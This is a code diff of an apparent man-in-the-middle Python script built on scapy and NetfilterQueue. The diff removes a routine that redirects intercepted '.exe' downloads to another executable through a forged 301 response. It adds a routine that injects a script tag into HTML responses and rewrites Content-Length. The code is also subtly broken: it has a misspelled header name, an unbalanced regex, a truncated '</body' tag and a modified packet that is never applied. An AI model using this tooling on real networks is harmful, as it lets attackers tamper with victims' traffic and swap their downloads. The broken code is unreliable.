@@ -9,8 +9,7 @@
 
 import scapy.all as scapy
 from netfilterqueue import NetfilterQueue
-
-ack_list=[]
+import re
 
 def set_load(packet,load):
 	packet[scapy.Raw].load=load 
@@ -22,16 +21,24 @@ def set_load(packet,load):
 def process_packet(packet):
 	scapy_packet = scapy.IP(packet.getpayload())
 	if scapy_packet.haslayer(scapy.Raw):
+		load=scapy_packet[scapy.Raw]
 		if scapy_packet[scapy.TCP].dport==80:
-			if ".exe" in scapy_packet[scapy.Raw].load and "192.168.1.5" not in scapy_packet[scapy.Raw].load:
-				print("\n exe Request")
-				ack_list.append(scapy_packet[scapy.TCP].ack)
+			print("Request")
+			load = re.sub("Accepy-Encoding:.*?\\r\\n","",load)
+			
 		elif scapy_packet[scapy.TCP].sport==80:
-			if scapy_packet[scapy.TCP].seq in ack_list:
-				ack_list.remove(scapy_packet[scapy.TCP].seq)
-				print("Replacing file")
-				modified_packet=set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n")
-				packet.set_payload(str(modified_packet))
+			print("Response")
+			injection_code="<script>alert('test');</script>"
+			load=load.replace("</body>",injection_code + "</body")
+			content_length_search=re.search("?:Content-length:\s)(\d*)",load)
+			if content_length_search and "text/html" in load:
+				content_length=content_length_search.group(1)
+				new_content_length=int(content_length)+len(injection_code)
+				load=load.replace(content_length,str(new_content_length))
+
+		if load!=scapy_packet[scapy.Raw].load:
+				new_packet=set_load(scapy_packet,load)
+	
 	packet.accept()
 
 queue=NetfilterQueue()
